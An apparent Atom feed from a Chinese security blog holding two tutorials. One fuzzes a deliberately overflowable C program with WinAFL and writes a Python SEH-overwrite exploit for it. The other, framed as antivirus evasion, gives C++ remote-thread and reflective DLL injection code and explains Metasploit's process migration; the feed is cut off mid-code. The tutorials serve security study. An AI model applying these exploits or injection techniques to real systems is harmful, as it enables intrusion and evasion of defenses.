<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Joe1sn&#39;s Cabinet</title>
  
  
  <link href="https://joe1sn.eu.org/atom.xml" rel="self"/>
  
  <link href="https://joe1sn.eu.org/"/>
  <updated>2023-07-19T06:41:17.842Z</updated>
  <id>https://joe1sn.eu.org/</id>
  
  <author>
    <name>Joe1sn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【漏洞挖掘】win-afl使用指北-初级篇</title>
    <link href="https://joe1sn.eu.org/2023/07/18/win-afl/"/>
    <id>https://joe1sn.eu.org/2023/07/18/win-afl/</id>
    <published>2023-07-18T07:27:44.000Z</published>
    <updated>2023-07-19T06:41:17.842Z</updated>
    
    <content type="html"><![CDATA[<p>相较于AFL和其他Linux的Fuzz工具</p><p>在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记</p><p>这里主要讲述WinAFL+DynamoRIO的Fuzz方法</p><span id="more"></span><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>知道创宇这篇文章讲的已经很好了：<a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p>由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移</p><p>WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz</p><h1 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h1><p>主要是参考了<a href="https://bbs.kanxue.com/thread-261323.htm%E5%92%8C%E5%AE%98%E6%96%B9%E8%BF%87%E7%A8%8B%EF%BC%9Ahttps://dynamorio.org/page_building.html">https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html</a></p><h2 id="dynamorio"><a class="markdownIt-Anchor" href="#dynamorio"></a> DynamoRIO</h2><h3 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h3><h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> 1. 编译</h4><p>软件下载一把梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DynamoRIO/dynamorio.git</span><br><span class="line">cd dynamorio</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><p>这里我使用的是<code>x86 Native Tools Command Prompt</code>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16&quot; -A Win32 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/77bda948b6a701db350fb235797056e0.png" alt="image-20230719000330825" /></p><p>如果发现缺少什么的话，使用<code>set Name=Value</code>再编译，最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --build . --config RelWithDebInfo</span><br></pre></td></tr></table></figure><h4 id="2-测试"><a class="markdownIt-Anchor" href="#2-测试"></a> 2. 测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_win32\bin32\drrun.exe&quot; -t drcov -- &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\HelloWorld.exe&quot; &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\password.txt&quot;</span><br></pre></td></tr></table></figure><p>这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过<a href="https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E7%9A%84%E8%BD%AC%E6%8D%A2%E3%80%82">https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。</a></p><p><img src="https://img.joe1sn.top/uploads/big/47ade84053329cd3875e97c5d3c19562.png" alt="image-20230719081301132" /></p><h3 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h3><h4 id="1-编译-2"><a class="markdownIt-Anchor" href="#1-编译-2"></a> 1. 编译</h4><p>按照官方的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /k &quot;C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsamd64_x86.bat&quot;</span><br></pre></td></tr></table></figure><p>或者启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Developer Command Prompt for VS 2019</span><br></pre></td></tr></table></figure><p>然后进行cmake配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -A x64 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/0e10d36abf96b93682871ec08ace8fa9.png" alt="image-20230719081540005" /></p><p>就可以参考看雪那篇文章修改下报错</p><p>利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019）</p><p><img src="https://img.joe1sn.top/uploads/big/f3984b961053db86e86b2e2056e66173.png" alt="image-20230719081913889" /></p><h4 id="2-测试-2"><a class="markdownIt-Anchor" href="#2-测试-2"></a> 2. 测试</h4><p><img src="https://img.joe1sn.top/uploads/big/e212aa65d03465a205a2b64ff66ea06d.png" alt="image-20230719082924046" /></p><h2 id="winafl"><a class="markdownIt-Anchor" href="#winafl"></a> WinAFL</h2><p>起手式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">cd winafl</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><ol><li><p>编译32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\cmake -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><p>如果显示<code>drgui</code>不完整，返回去在生成就行了，看雪上的教程是没有问题的</p></li><li><p>编译64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure></li></ol><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="32位-2"><a class="markdownIt-Anchor" href="#32位-2"></a> 32位</h2><ol><li><p>首先进行插桩</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 接受用户输入</span><br><span class="line"><span class="built_in">set</span> /p target_module=traget excutable : </span><br><span class="line"><span class="built_in">set</span> /p target_offset=traget offset : </span><br><span class="line"><span class="built_in">set</span> /p sample=pins sample: </span><br><span class="line"></span><br><span class="line">:: 输出用户输入的内容</span><br><span class="line"><span class="built_in">echo</span> target_module, <span class="variable">%target_module%</span>!</span><br><span class="line"><span class="built_in">echo</span> target_offset, <span class="variable">%target_offset%</span>!</span><br><span class="line"><span class="built_in">echo</span> sample, <span class="variable">%sample%</span>!</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">D:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">dynamorio</span>\<span class="title">build_Win32</span>\<span class="title">bin32</span>\<span class="title">drrun.exe</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">c</span> <span class="title">D</span>:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">winafl</span>\<span class="title">build_Win32</span>\<span class="title">bin</span>\<span class="title">Release</span>\<span class="title">winafl.dll</span> -<span class="title">debug</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">target_module</span> %<span class="title">target_module</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">target_offset</span> %<span class="title">target_offset</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">fuzz_iterations</span> 10 -<span class="title">nargs</span> 2 -- ^</span></span><br><span class="line"><span class="function">%<span class="title">target_module</span>% %<span class="title">sample</span>%</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">test.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>查看生成的log文件，如果有<code>Everything appears to be running normally.</code>那么就是完成了</p></li><li><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ea80329361bc5efe5305e79b94370480.png" alt="image-20230719131211815" /></p></li></ol><h2 id="64位-2"><a class="markdownIt-Anchor" href="#64位-2"></a> 64位</h2><p>过程也差不多</p><p>先插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">traget excutable : test.exe</span><br><span class="line">traget offset : 0x1200</span><br><span class="line">pins sample: .\in\input.bmp</span><br><span class="line">target_module, test.exe!</span><br><span class="line">target_offset, 0x1200!  </span><br><span class="line">sample, .\in\input.bmp!</span><br></pre></td></tr></table></figure><p>然后fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\bin64&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/916e80cff30a0ee3d94ceca18eb32ad4.png" alt="image-20230719134046975" /></p><h1 id="测试2-simplehunt"><a class="markdownIt-Anchor" href="#测试2-simplehunt"></a> 测试2 - SimpleHunt</h1><p>在之前我的博客写了windows下栈溢出的过程，这里我改写了下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc HelloWorld.c -o HelloWorld</span><br></pre></td></tr></table></figure><p>没有任何保护，这里以32位举例</p><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> fuzz</h2><p>由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe in\password.txt</span><br></pre></td></tr></table></figure><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module HelloWorld.exe ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec9214e2a5aada0ddc6e74f956f60bf9.png" alt="image-20230719140624246" /></p><p>瞬间找到一个crash</p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p><img src="https://img.joe1sn.top/uploads/big/80b03780c4fcd5ad58467691a3664471.png" alt="image-20230719140746701" /></p><p>使用x32dbg进行调试</p><p><img src="https://img.joe1sn.top/uploads/big/ce1aa16c4a51fe8d5fe578c891edc509.png" alt="image-20230719141111547" /></p><p>刚好修改了EBP寄存器导出错误，很明显的栈溢出。</p><p>具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了</p><p>写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9A\x24\x40\x00&quot;</span>    <span class="comment">#40249A</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04b0986fd3905d3622d739c4a5e3813d.gif" alt="output" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p><a href="https://bbs.kanxue.com/thread-261323.htm">https://bbs.kanxue.com/thread-261323.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;相较于AFL和其他Linux的Fuzz工具&lt;/p&gt;
&lt;p&gt;在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记&lt;/p&gt;
&lt;p&gt;这里主要讲述WinAFL+DynamoRIO的Fuzz方法&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】DLL注入小结</title>
    <link href="https://joe1sn.eu.org/2023/07/17/dll-injector/"/>
    <id>https://joe1sn.eu.org/2023/07/17/dll-injector/</id>
    <published>2023-07-17T11:24:51.000Z</published>
    <updated>2023-07-18T01:30:41.396Z</updated>
    
    <content type="html"><![CDATA[<p>DLL 注入进化史</p><span id="more"></span><h1 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h1><p>这个是最简单的</p><p>这里我接受的是程序的进程<code>PID</code>和待注入DLL的路径<code>szPath</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DLLinjector::DllOnLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;<span class="built_in">Check</span>())&#123;</span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;The Process or DLL file not found\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//向目标进程写入DLL的路径</span></span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="keyword">this</span>-&gt;dwPid);</span><br><span class="line">LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;szPath, <span class="built_in">wcslen</span>(<span class="keyword">this</span>-&gt;szPath)*<span class="number">2</span>+<span class="number">2</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    </span><br><span class="line">HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line"></span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;injection complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab29867d886c12b9b42013810ad19cbc.png" alt="image-20230717205213381" /></p><h1 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h1><p>这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里<a href="https://xz.aliyun.com/t/11072">https://xz.aliyun.com/t/11072</a></p><p><img src="https://img.joe1sn.top/uploads/big/8ac2e3d0d3139da37de7067a9a9d8e51.png" alt="image-20230717210533079" /></p><p>最大的区别就是我们没有使用<code>LoadLibarary</code>这个函数，而是相当于自己写了一个DLL加载器</p><p>仔细观察过程就看得出来，<strong>远程线程调用注入</strong>写入的是DLL路径，然后创建远程调用<code>LoadLibarary</code>（LPTHREAD_START_ROUTINE）</p><p><strong>反射DLL注入</strong>是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。</p><p>群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入</p><ol><li><p>读取metsrv.dll（metpreter payload模板dll）文件到内存中。</p></li><li><p>生成最终的payload。</p><p>a) msf生成一小段汇编migrate stub主要用于建立socket连接。</p><p>b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。</p><p>c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。</p></li><li><p>向msf server发送migrate请求和payload。</p></li><li><p>msf向迁移目标进程分配一块内存并写入payload。</p></li><li><p>msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。</p></li><li><p>reflective loader进行反射式dll注入。</p></li><li><p>最后msf client和msf server建立一个新的session。</p></li></ol><p>这里就不自己写了，参考的是<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>首先需要描述的就是DLL的解析过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( !hProcess  || !lpBuffer || !dwLength )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if the library has a ReflectiveLoader...</span></span><br><span class="line">dwReflectiveLoaderOffset = <span class="built_in">GetReflectiveLoaderOffset</span>( lpBuffer );</span><br><span class="line"><span class="keyword">if</span>( !dwReflectiveLoaderOffset )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// alloc memory (RWX) in the host process for the image...</span></span><br><span class="line">lpRemoteLibraryBuffer = <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="literal">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line"><span class="keyword">if</span>( !lpRemoteLibraryBuffer )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write the image into the host process...</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span> ) )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add the offset to ReflectiveLoader() to the remote 